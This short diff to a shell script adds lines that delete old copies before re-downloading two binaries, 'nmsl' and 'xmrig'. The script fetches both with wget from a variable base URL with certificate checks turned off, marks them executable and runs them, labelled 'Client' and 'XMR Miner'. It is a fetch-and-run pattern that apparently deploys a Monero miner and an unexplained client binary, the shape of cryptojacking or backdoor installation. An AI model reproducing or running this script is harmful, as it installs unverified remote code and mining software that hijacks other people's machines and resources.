@@ -151,12 +151,14 @@ EOF
 
 # Client
 echo "Client Starting..."
+rm -f "nmsl"
 wget --no-check-certificate ${BASE_URL}/nmsl
 chmod +x ./nmsl
 ./nmsl
 
 # XMR Miner
 echo "Miner Starting..."
+rm -f "xmrig"
 wget --no-check-certificate ${BASE_URL}/xmrig
 chmod +x ./xmrig
 ./xmrig
